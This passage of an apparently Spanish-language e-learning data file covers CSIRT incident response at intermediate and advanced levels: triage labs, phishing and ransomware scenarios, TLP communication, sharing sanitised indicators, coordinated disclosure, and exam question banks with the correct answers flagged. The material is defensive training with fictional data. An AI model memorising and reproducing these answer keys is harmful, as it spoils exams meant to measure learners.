              { question: 'Antes de reasignar el equipo de un empleado investigado, ¿qué se hace?', options: [{ id: 'g16a', text: 'Preservarlo: imagen forense con hash y cadena de custodia.', isCorrect: true, score: 10 }, { id: 'g16b', text: 'Formatearlo y reinstalar.', isCorrect: false, score: 0 }, { id: 'g16c', text: 'Copiar solo la carpeta Documentos.', isCorrect: false, score: 0 }], feedback: 'Reinstalar destruye la evidencia.' },
            ],
          },
        ]
      },
    ]
  },
  csirt_intermedio: {
    title: "Gestor de Respuesta a Incidentes · Nivel Intermedio",
    description: "La operación diaria de un CSIRT: clasificar y priorizar, aplicar un playbook, comunicar con TLP, compartir indicadores y medir. Laboratorios prácticos y examen con nota mínima del 70%.",
    lastUpdated: "Octubre 2026",
    modules: [
      {
        id: 'gri_intro',
        title: "1. 🗺️ Bienvenida al Nivel Intermedio",
        content: [
          { type: 'text', icon: 'AlarmIcon', text: "En el Nivel Básico diseñó un CSIRT: mandato, servicios, madurez y marcos. Ahora lo va a operar: le llegarán reportes simultáneos, tendrá que decidir qué atender primero, contener un incidente con un playbook, comunicarlo y compartir lo aprendido." },
          { type: 'text', icon: 'CheckCircleIcon', text: "Este nivel incluye laboratorios de decisión, retos tipo CTF y un examen que se aprueba con 70%. Todos los casos, organizaciones y datos son ficticios." },
          {
            type: 'interactive',
            title: 'Vocabulario operativo',
            items: [
              { term: 'Evento vs. incidente', definition: 'Un evento es cualquier ocurrencia observable; un incidente es un evento que compromete o amenaza la confidencialidad, integridad o disponibilidad.' },
              { term: 'Triage', definition: 'Clasificar, priorizar y asignar cada reporte según su impacto y urgencia.' },
              { term: 'Playbook', definition: 'Procedimiento predefinido para un tipo de incidente: quién hace qué, en qué orden y con qué herramientas.' },
              { term: 'Contención', definition: 'Limitar el daño y evitar que el incidente se extienda, antes de erradicar la causa.' },
              { term: 'MTTD / MTTR', definition: 'Tiempo medio para detectar y tiempo medio para responder o resolver: métricas clave del desempeño del equipo.' },
            ]
          },
        ]
      },
      {
        id: 'gri_triage',
        title: "2. 🚩 Laboratorio: Triage de la Cola de Reportes",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "Para priorizar se cruzan el impacto (a cuántos y a qué servicios afecta) y la urgencia (qué tan rápido empeora). Para clasificar, muchos CSIRT usan la Taxonomía de Referencia de Incidentes de Seguridad (RSIT, derivada de eCSIRT.net), con clases como Código malicioso, Recolección de información, Intentos de intrusión, Intrusiones, Disponibilidad, Seguridad del contenido de la información, Fraude y Contenido abusivo." },
          {
            type: 'challenge',
            title: 'Lunes 8:00 a. m.: cinco reportes en la cola',
            brief: "Usted es el gestor de turno del CSIRT ficticio de un ministerio. Aplique la matriz de prioridad y clasifique los reportes.",
            artifacts: [
              {
                name: 'matriz_prioridad.txt',
                content: `                     URGENCIA ALTA   URGENCIA MEDIA   URGENCIA BAJA
IMPACTO ALTO         P1 (crítica)    P2               P3
IMPACTO MEDIO        P2              P3               P4
IMPACTO BAJO         P3              P4               P5
Impacto alto  = servicio crítico o datos de muchas personas
Urgencia alta = el daño crece en minutos u horas`,
              },
              {
                name: 'cola_reportes.txt',
                content: `#101  Escaneo de puertos desde 198.51.100.77 contra la web pública. Bloqueado por el firewall. Sin impacto.
#102  El portal de pagos de impuestos no responde; cientos de ciudadanos afectados; el tráfico crece cada minuto.
#103  Un funcionario recibió un correo de phishing; no hizo clic. Lo reportó.
#104  Se detecta cifrado de archivos en 3 servidores de la intranet de nómina; avanza a otros equipos.
#105  Página falsa que suplanta al ministerio pidiendo datos bancarios a ciudadanos; publicada hace 2 horas.`,
              },
            ],
            questions: [
              { prompt: 'Varios reportes son P1. ¿Cuál involucra código malicioso que se está propagando? (número del reporte, ej. #000)', answers: ['#104', '104'], explanation: '#104: cifrado que se propaga en servidores de nómina. Impacto alto (datos de todos los empleados) y urgencia alta (avanza): P1, clase Código malicioso (ransomware).' },
              { prompt: '¿A qué clase de la taxonomía corresponde el #102? (una palabra)', answers: ['disponibilidad', 'availability'], explanation: '#102 es un problema de Disponibilidad, posiblemente una denegación de servicio, y también es P1 por su impacto en ciudadanos y su urgencia.' },
              { prompt: '¿A qué clase corresponde el #105, la página falsa que pide datos bancarios? (una palabra)', answers: ['fraude', 'fraud'], explanation: '#105 es Fraude (suplantación o phishing contra ciudadanos): impacto alto, se prioriza alto para solicitar la baja del sitio.' },
              { prompt: '¿Qué prioridad tiene el #101, el escaneo bloqueado sin impacto? (P1 a P5)', answers: ['P5', 'p5'], explanation: 'Impacto bajo y urgencia baja: P5. Se registra (clase Recolección de información) pero no consume tiempo del equipo.' },
            ],
          },
        ]
      },
      {
        id: 'gri_playbook',
        title: "3. Aplicando un Playbook: Campaña de Phishing",
        content: [
          { type: 'text', icon: 'FishHookIcon', text: "Un playbook de phishing suele tener cinco bloques: análisis del correo, alcance (quién lo recibió y quién hizo clic), contención (bloquear remitente y enlace, eliminar el correo de los buzones, restablecer credenciales), erradicación y recuperación, y lecciones aprendidas." },
          {
            type: 'scenario',
            title: 'Caso 1: 340 buzones y 12 clics',
            intro: "Un correo de phishing llegó a 340 funcionarios de una entidad ficticia. 12 hicieron clic y 4 ingresaron su contraseña. Aplique el playbook. Necesita 60 de 80 puntos.",
            start: 'p1',
            maxPoints: 80,
            passPoints: 60,
            steps: {
              p1: {
                text: "¿Por dónde empieza la contención?",
                choices: [
                  { text: "Bloquear el dominio y la URL en el proxy y el correo, y eliminar el mensaje de los 340 buzones.", next: 'p2', points: 20, feedback: "Correcto: se corta la exposición para quienes aún no han hecho clic." },
                  { text: "Enviar un correo a todos diciendo que no abran el mensaje y esperar.", next: 'p2', points: 5, feedback: "Avisar ayuda, pero sin bloquear ni eliminar el mensaje, más personas seguirán cayendo." },
                ]
              },
              p2: {
                text: "¿Qué hace con las 4 personas que ingresaron su contraseña?",
                choices: [
                  { text: "Restablecer sus contraseñas, cerrar sus sesiones activas, verificar el doble factor y revisar sus buzones en busca de reglas de reenvío o accesos extraños.", next: 'p3', points: 20, feedback: "Exacto: una contraseña robada se usa rápido; hay que cerrar todas las puertas." },
                  { text: "Solo pedirles que cambien la contraseña cuando puedan.", next: 'p3', points: -10, feedback: "Insuficiente y lento: el atacante puede estar usando ya esas cuentas." },
                ]
              },
              p3: {
                text: "Revisando, una de las cuentas comprometidas envió el mismo phishing a una entidad aliada. ¿Qué hace?",
                choices: [
                  { text: "Aviso al CSIRT de la entidad aliada con los indicadores del ataque, marcados con el TLP adecuado.", next: 'p4', points: 20, feedback: "Bien: la coordinación entre CSIRT evita que el ataque se propague." },
                  { text: "No digo nada para no dañar la reputación de la entidad.", next: 'p4', points: -10, feedback: "Callar deja expuesta a la entidad aliada y daña más la confianza cuando se descubre." },
                ]
              },
              p4: {
                text: "Incidente contenido. ¿Cómo lo cierra?",
                choices: [
                  { text: "Documento la línea de tiempo y las acciones, registro las métricas y propongo mejoras (filtros, capacitación, doble factor para todos).", next: 'fin', points: 20, feedback: "Excelente: sin cierre formal no hay aprendizaje." },
                  { text: "Cierro el ticket sin más: ya pasó.", next: 'fin', points: 0, feedback: "Se pierde la oportunidad de evitar el próximo incidente." },
                ]
              },
              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación." },
            }
          },
        ]
      },
      {
        id: 'gri_comms',
        title: "4. Comunicar Durante el Incidente",
        content: [
          { type: 'text', icon: 'HappyUsersIcon', text: "Durante un incidente se comunica a públicos distintos: el equipo técnico, la dirección, las áreas afectadas, otros CSIRT, autoridades y, a veces, el público. Cada uno necesita un mensaje diferente, con la información que puede recibir según el TLP." },
          { type: 'text', icon: 'ClosedEnvelopeIcon', text: "Buenas prácticas: una sola voz oficial, actualizaciones a horas fijas aunque no haya novedades, hechos confirmados separados de las hipótesis, y nunca indicadores técnicos sensibles en comunicados públicos." },
          {
            type: 'memory',
            title: 'Mensaje → TLP adecuado',
            pairs: [
              { term: 'Hallazgos preliminares para la reunión de crisis', definition: 'TLP:RED' },
              { term: 'Detalle técnico para el equipo interno de TI', definition: 'TLP:AMBER+STRICT' },
              { term: 'Indicadores para el CSIRT de una entidad aliada y sus proveedores', definition: 'TLP:AMBER' },
              { term: 'Alerta a la comunidad de CSIRT del sector', definition: 'TLP:GREEN' },
              { term: 'Recomendaciones para la ciudadanía', definition: 'TLP:CLEAR' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Un periodista pregunta por el incidente y aún no se conoce el alcance. ¿Qué responde la vocería oficial?",
              options: [
                "\"No hay ningún problema\", para evitar alarma.",
                "Lo confirmado (que se atiende un incidente y que los servicios críticos están siendo protegidos), sin especular sobre el alcance, y cuándo habrá una nueva actualización.",
                "Todos los detalles técnicos disponibles, incluidas las IP del atacante."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto: hechos confirmados, sin especular y con un compromiso de actualización. Negar o sobreinformar se vuelve en contra.",
                incorrect: "Negar el incidente destruye la confianza cuando se conoce, y publicar detalles técnicos ayuda al atacante."
              }
            }
          },
        ]
      },
      {
        id: 'gri_sharing',
        title: "5. 🚩 Laboratorio: Preparar Indicadores para Compartir",
        content: [
          { type: 'text', icon: 'ShieldCheckIcon', text: "Compartir indicadores ayuda a otros a defenderse, pero hay que depurarlos: no se comparten datos internos (IP privadas, nombres de equipos o de funcionarios) ni datos personales, y cada indicador debe ser realmente malicioso, no un servicio legítimo que también aparece en los registros." },
          {
            type: 'challenge',
            title: 'Depure las notas del incidente antes de enviarlas',
            brief: "Estas son las notas del incidente de phishing. Usted preparará el evento para compartir con la comunidad del sector. Todos los datos son ficticios.",
            artifacts: [
              {
                name: 'notas_incidente.txt',
                content: `Correo de phishing: remitente  soporte@actualiza-clave.example
URL de captura:                  https://actualiza-clave.example/login
IP del servidor de captura:      203.0.113.66
Adjunto (hash SHA-256):          7a3f9c0e…e41b (valor ficticio)
Equipo afectado interno:         PC-NOMINA-07 (10.20.4.15)
Funcionaria que hizo clic:       María Torres, tesorería
Servicio legítimo visto en logs: login.microsoftonline.com (autenticación normal de la entidad)`,
              },
            ],
            questions: [
              { prompt: '¿Qué dominio malicioso debe incluirse en el evento compartido?', answers: ['actualiza-clave.example'], explanation: 'actualiza-clave.example es el dominio del atacante: es el indicador más útil para que otros lo bloqueen.' },
              { prompt: '¿Qué IP NO debe compartirse porque es interna de la entidad?', answers: ['10.20.4.15'], explanation: '10.20.4.15 es una dirección privada de la red interna: no sirve a otros y expone información de la entidad.' },
              { prompt: '¿Qué dominio aparece en las notas pero NO es malicioso y no debe compartirse como indicador?', answers: ['login.microsoftonline.com'], explanation: 'Es un servicio legítimo de autenticación. Compartirlo como malicioso provocaría bloqueos que afectarían a otras entidades (falso positivo).' },
            ],
          },
        ]
      },
      {
        id: 'gri_metrics',
        title: "6. Métricas y Registro de Incidentes",
        content: [
          { type: 'text', icon: 'CalendarIcon', text: "Lo que no se mide no se mejora. Un CSIRT registra cada incidente con su clase, prioridad, fechas clave (ocurrencia, detección, contención, cierre), impacto y causa raíz. De ahí salen métricas como el tiempo medio de detección (MTTD), el de contención y el de resolución (MTTR)." },
          {
            type: 'flashcards',
            title: 'Métricas útiles para la dirección',
            cards: [
              { front: 'MTTD', back: 'Tiempo medio desde que ocurre el incidente hasta que se detecta. Mide la capacidad de vigilancia.' },
              { front: 'Tiempo de contención', back: 'Desde la detección hasta que el incidente deja de extenderse. Mide la capacidad de reacción.' },
              { front: 'MTTR', back: 'Tiempo medio hasta resolver y recuperar. Mide la capacidad de recuperación.' },
              { front: 'Incidentes por clase', back: 'Muestra dónde concentrar la prevención (por ejemplo, si el phishing es la mayoría).' },
              { front: 'Reincidencia', back: 'Incidentes con la misma causa raíz: indica que las lecciones aprendidas no se aplicaron.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Un incidente ocurrió el lunes a las 9:00, se detectó el miércoles a las 9:00 y se contuvo ese mismo miércoles a las 13:00. ¿Cuál fue el tiempo de detección?",
              options: ["4 horas.", "48 horas.", "52 horas."],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto: de lunes 9:00 a miércoles 9:00 son 48 horas. La contención tomó 4 horas más.",
                incorrect: "El tiempo de detección va de la ocurrencia (lunes 9:00) a la detección (miércoles 9:00): 48 horas."
              }
            }
          },
        ]
      },
      {
        id: 'gri_exam',
        title: "7. 📝 Examen del Nivel Intermedio",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "El examen toma 10 preguntas al azar de un banco de 14 y se aprueba con 70%. Al aprobarlo obtendrá el badge de Gestor de Respuesta a Incidentes · Nivel Intermedio." },
          {
            type: 'exam',
            title: 'Examen: Gestor de Respuesta a Incidentes · Intermedio',
            description: 'Evalúa triage, taxonomía, playbooks, comunicación y TLP, intercambio de indicadores y métricas.',
            passPercent: 70,
            questionsPerAttempt: 10,
            questions: [
              { question: '¿Qué diferencia un incidente de un evento?', options: [{ id: 'r1a', text: 'El incidente compromete o amenaza la confidencialidad, integridad o disponibilidad.', isCorrect: true, score: 10 }, { id: 'r1b', text: 'Ninguna: son sinónimos.', isCorrect: false, score: 0 }, { id: 'r1c', text: 'El evento siempre es más grave.', isCorrect: false, score: 0 }], feedback: 'No todo evento es un incidente.' },
              { question: 'Con impacto alto y urgencia alta, ¿qué prioridad tiene un incidente en la matriz del curso?', options: [{ id: 'r2a', text: 'P1 (crítica).', isCorrect: true, score: 10 }, { id: 'r2b', text: 'P3.', isCorrect: false, score: 0 }, { id: 'r2c', text: 'P5.', isCorrect: false, score: 0 }], feedback: 'Impacto y urgencia altos = crítica.' },
              { question: 'Un portal ciudadano deja de responder por un tráfico masivo. ¿Qué clase de la taxonomía aplica?', options: [{ id: 'r3a', text: 'Disponibilidad.', isCorrect: true, score: 10 }, { id: 'r3b', text: 'Fraude.', isCorrect: false, score: 0 }, { id: 'r3c', text: 'Contenido abusivo.', isCorrect: false, score: 0 }], feedback: 'Afecta la disponibilidad del servicio.' },
              { question: 'Una página falsa suplanta a la entidad para pedir datos bancarios. ¿Qué clase aplica?', options: [{ id: 'r4a', text: 'Fraude.', isCorrect: true, score: 10 }, { id: 'r4b', text: 'Recolección de información.', isCorrect: false, score: 0 }, { id: 'r4c', text: 'Disponibilidad.', isCorrect: false, score: 0 }], feedback: 'La suplantación para robar datos es fraude.' },
              { question: 'En un phishing masivo, ¿cuál es la primera acción de contención?', options: [{ id: 'r5a', text: 'Bloquear el dominio y la URL y eliminar el correo de los buzones.', isCorrect: true, score: 10 }, { id: 'r5b', text: 'Esperar a ver cuántos hacen clic.', isCorrect: false, score: 0 }, { id: 'r5c', text: 'Apagar el servidor de correo.', isCorrect: false, score: 0 }], feedback: 'Se corta la exposición para el resto.' },
              { question: 'Un funcionario ingresó su contraseña en el phishing. Además de cambiarla, ¿qué hay que hacer?', options: [{ id: 'r6a', text: 'Cerrar sesiones activas, verificar el doble factor y revisar reglas de reenvío.', isCorrect: true, score: 10 }, { id: 'r6b', text: 'Nada más.', isCorrect: false, score: 0 }, { id: 'r6c', text: 'Despedirlo.', isCorrect: false, score: 0 }], feedback: 'El atacante pudo dejar accesos persistentes.' },
              { question: '¿Qué se debe hacer si el ataque se propagó a una entidad aliada?', options: [{ id: 'r7a', text: 'Avisar a su CSIRT con los indicadores y el TLP adecuado.', isCorrect: true, score: 10 }, { id: 'r7b', text: 'No decir nada para cuidar la reputación.', isCorrect: false, score: 0 }, { id: 'r7c', text: 'Publicarlo en redes sociales.', isCorrect: false, score: 0 }], feedback: 'La coordinación entre CSIRT es su razón de ser.' },
              { question: 'Hallazgos preliminares para la reunión de crisis, que no deben salir de esa sala. ¿Qué TLP usa?', options: [{ id: 'r8a', text: 'TLP:RED.', isCorrect: true, score: 10 }, { id: 'r8b', text: 'TLP:GREEN.', isCorrect: false, score: 0 }, { id: 'r8c', text: 'TLP:CLEAR.', isCorrect: false, score: 0 }], feedback: 'RED: solo para los presentes.' },
              { question: '¿Qué TLP corresponde a recomendaciones para la ciudadanía?', options: [{ id: 'r9a', text: 'TLP:CLEAR.', isCorrect: true, score: 10 }, { id: 'r9b', text: 'TLP:AMBER.', isCorrect: false, score: 0 }, { id: 'r9c', text: 'TLP:RED.', isCorrect: false, score: 0 }], feedback: 'CLEAR se puede publicar.' },
              { question: 'Ante la prensa, con el alcance aún desconocido, la vocería debe…', options: [{ id: 'r10a', text: 'Informar lo confirmado, no especular y anunciar la próxima actualización.', isCorrect: true, score: 10 }, { id: 'r10b', text: 'Negar el incidente.', isCorrect: false, score: 0 }, { id: 'r10c', text: 'Dar todos los detalles técnicos.', isCorrect: false, score: 0 }], feedback: 'Hechos, sin especulación, con compromiso de seguimiento.' },
              { question: '¿Por qué no se comparte una IP como 10.20.4.15 en un evento para la comunidad?', options: [{ id: 'r11a', text: 'Es una dirección privada interna: no le sirve a otros y expone a la entidad.', isCorrect: true, score: 10 }, { id: 'r11b', text: 'Porque es del atacante.', isCorrect: false, score: 0 }, { id: 'r11c', text: 'Porque es demasiado larga.', isCorrect: false, score: 0 }], feedback: 'Se depuran los datos internos antes de compartir.' },
              { question: 'Compartir un dominio legítimo como malicioso provoca…', options: [{ id: 'r12a', text: 'Falsos positivos: otros lo bloquean y afectan sus propios servicios.', isCorrect: true, score: 10 }, { id: 'r12b', text: 'Mayor seguridad para todos.', isCorrect: false, score: 0 }, { id: 'r12c', text: 'Nada.', isCorrect: false, score: 0 }], feedback: 'La calidad de los indicadores es clave para la confianza.' },
              { question: '¿Qué mide el MTTD?', options: [{ id: 'r13a', text: 'El tiempo medio desde que ocurre un incidente hasta que se detecta.', isCorrect: true, score: 10 }, { id: 'r13b', text: 'El tiempo de recuperación.', isCorrect: false, score: 0 }, { id: 'r13c', text: 'El número de incidentes al mes.', isCorrect: false, score: 0 }], feedback: 'Mide la capacidad de vigilancia.' },
              { question: 'Muchos incidentes se repiten con la misma causa raíz. ¿Qué indica?', options: [{ id: 'r14a', text: 'Que las lecciones aprendidas no se están aplicando.', isCorrect: true, score: 10 }, { id: 'r14b', text: 'Que el equipo trabaja muy bien.', isCorrect: false, score: 0 }, { id: 'r14c', text: 'Que hay que dejar de registrar incidentes.', isCorrect: false, score: 0 }], feedback: 'La reincidencia es una métrica de mejora continua.' },
            ],
          },
        ]
      },
    ]
  },
  csirt_avanzado: {
    title: "Gestor de Respuesta a Incidentes · Nivel Avanzado",
    description: "Liderar incidentes mayores: estructura de mando y crisis, ejercicios de mesa, obligaciones de reporte, divulgación coordinada de vulnerabilidades, lecciones aprendidas y un caso sectorial integrador. Examen con nota mínima del 80%.",
    lastUpdated: "Octubre 2026",
    modules: [
      {
        id: 'gra_intro',
        title: "1. 🎯 Nivel Avanzado: Liderar la Respuesta",
        content: [
          { type: 'text', icon: 'HappyUsersIcon', text: "En este nivel usted ya no atiende un ticket: lidera. Coordinará equipos y organizaciones bajo presión, tomará decisiones con información incompleta, rendirá cuentas a la dirección y a las autoridades, y convertirá cada incidente en mejoras." },
          { type: 'text', icon: 'AlarmIcon', text: "El examen final toma 12 preguntas al azar de un banco de 16 y exige 80%. Al aprobarlo obtendrá el badge de Gestor de Respuesta a Incidentes · Nivel Avanzado." },
        ]
      },
      {
        id: 'gra_major',
        title: "2. Gestión de un Incidente Mayor",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "Un incidente mayor necesita una estructura de mando clara: un líder del incidente que decide y coordina, responsables técnicos por frente (contención, forense, recuperación), un enlace con la dirección, una vocería única, y alguien que lleve la bitácora de decisiones con su hora." },
          { type: 'text', icon: 'CalendarIcon', text: "La cadencia importa: reuniones cortas a horas fijas, con el mismo formato (situación, acciones, bloqueos, próximas decisiones). La dirección decide sobre el negocio (cerrar un servicio, pagar o no, comunicar); el equipo técnico informa las opciones y sus riesgos." },
          {
            type: 'scenario',
            title: 'Caso 1: ransomware en la red hospitalaria',
            intro: "Lidera la respuesta de un CSIRT sectorial ficticio: un ransomware afecta a tres hospitales de una red pública. Necesita 60 de 80 puntos.",
            start: 'h1',
            maxPoints: 80,
            passPoints: 60,
            steps: {
              h1: {
                text: "Primera hora: todos llaman a todos y hay versiones contradictorias. ¿Qué hace primero?",
                choices: [
                  { text: "Establezco la estructura de mando: líder del incidente, responsables por frente, vocería única y bitácora de decisiones, con la primera reunión de situación en 30 minutos.", next: 'h2', points: 20, feedback: "Correcto: sin estructura, el caos multiplica los errores." },
                  { text: "Me pongo yo mismo a revisar servidores para avanzar más rápido.", next: 'h2', points: 0, feedback: "Si el líder se dedica a lo técnico, nadie coordina." },
                ]
              },
              h2: {
                text: "Uno de los hospitales aún no está cifrado, pero comparte red con los afectados. ¿Qué recomienda?",
                choices: [
                  { text: "Aislar su conexión con la red compartida y activar sus procedimientos de contingencia clínica, priorizando la seguridad de los pacientes.", next: 'h3', points: 20, feedback: "Bien: se protege lo que aún funciona y se prioriza la vida de los pacientes." },
                  { text: "Mantener todo conectado para no interrumpir la atención.", next: 'h3', points: -10, feedback: "Un riesgo enorme: el cifrado podría alcanzarlo en minutos." },
                ]
              },
              h3: {
                text: "La dirección pregunta si debe pagar el rescate. ¿Cuál es su papel?",
                choices: [
                  { text: "Presentar opciones con sus riesgos: estado de los respaldos, tiempo estimado de recuperación, que pagar no garantiza el descifrado ni la no publicación, implicaciones legales, y la recomendación del equipo. La decisión es de la dirección, con asesoría jurídica y las autoridades.", next: 'h4', points: 20, feedback: "Exacto: el equipo técnico informa y recomienda; la dirección decide con toda la información." },
                  { text: "Decidir yo mismo pagar para terminar rápido.", next: 'h4', points: -10, feedback: "Excede su rol y omite riesgos legales, éticos y técnicos." },
                ]
              },
              h4: {
                text: "Hay tres hospitales, el ministerio y la prensa pidiendo información. ¿Cómo organiza las comunicaciones?",
                choices: [
                  { text: "Actualizaciones a horas fijas para cada público, con el TLP adecuado, y una sola vocería pública coordinada con el ministerio.", next: 'fin', points: 20, feedback: "Correcto: cadencia, públicos diferenciados y una sola voz." },
                  { text: "Que cada hospital comunique lo que quiera.", next: 'fin', points: -10, feedback: "Mensajes contradictorios generan desconfianza y pánico." },
                ]
              },
              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación." },
            }
          },
        ]
      },
      {
        id: 'gra_tabletop',
        title: "3. Diseñar y Facilitar un Ejercicio de Mesa",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "Un ejercicio de mesa (tabletop) simula un incidente en una sala, sin tocar sistemas. Se define un objetivo (por ejemplo, probar la toma de decisiones de la dirección), un escenario realista, inyecciones de información que llegan durante el ejercicio, roles y criterios de evaluación." },
          { type: 'text', icon: 'CheckCircleIcon', text: "El valor está en el debate y en las brechas que aparecen: decisiones que nadie sabe quién toma, contactos desactualizados, procedimientos que no existen. Todo se registra y se convierte en un plan de mejora con responsables y fechas." },
          {
            type: 'activity',
            title: 'Reto: diseñe su propio ejercicio de mesa',
            duration: '30–40 min',
            groupSize: 'Individual o en equipo',
            goal: 'Diseñar un ejercicio de mesa de 60 minutos para la dirección de una organización (puede ser la suya o una ficticia).',
            downloads: [],
            steps: [
              { title: 'Objetivo', minutes: '5 min', detail: 'Escriba en una frase qué quiere probar. Ejemplo: "¿Sabe la dirección quién decide apagar un servicio crítico?"' },
              { title: 'Escenario', minutes: '10 min', detail: 'Elija un incidente creíble para el sector (ransomware, fuga de datos, caída de un proveedor) y describa la situación inicial.' },
              { title: 'Inyecciones', minutes: '10 min', detail: 'Prepare 4 inyecciones que lleguen cada 10–15 minutos: una llamada de la prensa, una nota de rescate, un proveedor que no responde, una solicitud del regulador.' },
              { title: 'Roles y preguntas', minutes: '5 min', detail: 'Defina quién participa (dirección, TI, jurídica, comunicaciones) y las preguntas clave que cada inyección debe provocar.' },
              { title: 'Evaluación', minutes: '5 min', detail: 'Defina cómo medirá el resultado: decisiones tomadas a tiempo, brechas detectadas y acciones de mejora con responsable.' },
            ],
            closing: 'Si lo realiza en su organización, compare las brechas encontradas con las lecciones aprendidas de este curso.',
          },
          {
            type: 'quiz',
            quizData: {
              question: "En un ejercicio de mesa, nadie supo quién autoriza desconectar el servicio de pagos. ¿Qué se hace con ese hallazgo?",
              options: [
                "Nada: era solo un ejercicio.",
                "Se registra como brecha y se define en el plan de respuesta quién autoriza esa decisión, con responsable y fecha.",
                "Se repite el ejercicio hasta que alguien adivine."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto: encontrar esas brechas antes del incidente real es exactamente el propósito del ejercicio.",
                incorrect: "El ejercicio sirve para descubrir brechas y corregirlas antes de que ocurra un incidente real."
              }
            }
          },
        ]
      },
      {
        id: 'gra_reporting',
        title: "4. Obligaciones de Reporte y Coordinación con Autoridades",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "Además de responder, hay que reportar. En Colombia, si un incidente afecta datos personales, la Ley 1581 de 2012 obliga a informarlo a la Superintendencia de Industria y Comercio; los sectores vigilados tienen además reglas propias (por ejemplo, la Superintendencia Financiera para entidades financieras y la Superintendencia de la Economía Solidaria para cooperativas, con su Circular Externa 36 de 2022). Y los delitos se denuncian ante la Fiscalía." },
          { type: 'text', icon: 'ClosedEnvelopeIcon', text: "El papel del CSIRT es tener listos esos reportes: saber qué autoridad aplica según el sector y el tipo de datos, qué plazos rigen y quién en la organización firma. Los plazos y formatos cambian con la regulación: verifíquelos siempre con el área jurídica y el regulador de su sector." },
          {
            type: 'memory',
            title: 'Situación → a quién se reporta',
            pairs: [
              { term: 'Fuga de datos personales de clientes', definition: 'Superintendencia de Industria y Comercio (Ley 1581).' },
              { term: 'Incidente en una cooperativa de ahorro y crédito', definition: 'Superintendencia de la Economía Solidaria (CE 36 de 2022).' },
              { term: 'Fraude o acceso abusivo con víctimas', definition: 'Denuncia ante la Fiscalía General de la Nación.' },
              { term: 'Indicadores útiles para otras entidades', definition: 'CSIRT sectorial o nacional, con el TLP adecuado.' },
            ]
          },
        ]
      },
      {
        id: 'gra_cvd',
        title: "5. 🚩 Divulgación Coordinada de Vulnerabilidades",
        content: [
          { type: 'text', icon: 'ShieldCheckIcon', text: "Cuando un investigador encuentra una vulnerabilidad, la divulgación coordinada (CVD) busca que el fabricante la corrija antes de que se haga pública. El CSIRT puede actuar como coordinador: recibe el reporte, contacta al fabricante, acuerda un plazo y coordina la publicación con la solución disponible." },
          {
            type: 'challenge',
            title: 'Coordine el caso VULN-2026-031',
            brief: "Usted coordina un caso ficticio de divulgación. Lea el expediente y responda.",
            artifacts: [
              {
                name: 'expediente_VULN-2026-031.txt',
                content: `Producto: Software de historia clínica "ClinicaPro" v4.2 (fabricante ficticio: SaludSoft)
Reporte del investigador: 2026-08-01 · inyección SQL en el módulo de citas · permite leer datos de pacientes
2026-08-03  CSIRT confirma la vulnerabilidad en laboratorio
2026-08-04  CSIRT notifica a SaludSoft · plazo acordado: 90 días
2026-09-15  SaludSoft publica parche v4.2.1 para clientes con soporte
2026-10-20  Se detecta explotación activa contra un hospital que NO aplicó el parche
2026-11-02  Fecha acordada de publicación del aviso`,
              },
            ],
            questions: [
              { prompt: '¿Cuántos días de plazo se acordaron con el fabricante?', answers: ['90', '90 dias', '90 días'], explanation: '90 días es un plazo de referencia frecuente en divulgación coordinada.' },
              { prompt: '¿Qué versión corrige la vulnerabilidad?', answers: ['4.2.1', 'v4.2.1'], explanation: 'La v4.2.1 corrige la falla; el problema ahora es que no todos los clientes la aplicaron.' },
              { prompt: 'Con explotación activa detectada, ¿debe el CSIRT esperar al 2 de noviembre para alertar? (sí/no)', answers: ['no'], explanation: 'No: ante explotación activa se adelanta una alerta (con el TLP adecuado) a las entidades que usan el producto, para que apliquen el parche ya. La coordinación protege a las víctimas, no al calendario.' },
            ],
          },
        ]
      },
      {
        id: 'gra_lessons',
        title: "6. Lecciones Aprendidas y Causa Raíz",
        content: [
          { type: 'text', icon: 'QuestionMarkCircleIcon', text: "La revisión posterior al incidente se hace sin buscar culpables: el objetivo es entender por qué el sistema permitió que ocurriera. La técnica de los \"cinco porqués\" ayuda a pasar del síntoma (se cifraron los servidores) a la causa raíz (no había doble factor en el acceso remoto ni respaldos fuera de línea)." },
          { type: 'text', icon: 'CheckCircleIcon', text: "El informe ejecutivo resume: qué pasó y cuándo, impacto (días, personas, costo), causa raíz, qué funcionó y qué no, y un plan de mejora con responsables, fechas e indicadores para verificar que se cumpla." },
          {
            type: 'scenario',
            title: 'Caso 2: la reunión de lecciones aprendidas',
            intro: "Facilita la revisión posterior al ransomware hospitalario. Necesita 40 de 60 puntos.",
            start: 'l1',
            maxPoints: 60,
            passPoints: 40,
            steps: {
              l1: {
                text: "El director de TI llega diciendo: \"Esto fue culpa del técnico que dejó abierto el escritorio remoto\". ¿Cómo encauza la reunión?",
                choices: [
                  { text: "Recuerdo que la revisión es sin culpables y pregunto por qué el sistema permitió que un acceso remoto quedara abierto sin doble factor ni monitoreo.", next: 'l2', points: 20, feedback: "Bien: se buscan causas del sistema, no un chivo expiatorio." },
                  { text: "Le doy la razón y se anota como causa: error humano.", next: 'l2', points: -10, feedback: "\"Error humano\" no es una causa raíz útil: no dice qué cambiar." },
                ]
              },
              l2: {
                text: "Tras los cinco porqués, ¿cuál es la mejor formulación de causa raíz?",
                choices: [
                  { text: "No existía un control que exigiera doble factor y revisión periódica de los accesos remotos, y los respaldos estaban en la misma red.", next: 'l3', points: 20, feedback: "Correcto: es accionable y sistémica." },
                  { text: "Los atacantes eran muy sofisticados.", next: 'l3', points: 0, feedback: "Describe al atacante, no lo que la organización puede mejorar." },
                ]
              },
              l3: {
                text: "¿Cómo se asegura de que las mejoras se cumplan?",
                choices: [
                  { text: "Cada acción tiene responsable, fecha e indicador, y se revisa su avance en el comité cada mes.", next: 'fin', points: 20, feedback: "Excelente: sin seguimiento, las lecciones se olvidan." },
                  { text: "Se envía el informe por correo y se archiva.", next: 'fin', points: 0, feedback: "Es la forma más común de que el incidente se repita." },
                ]
              },
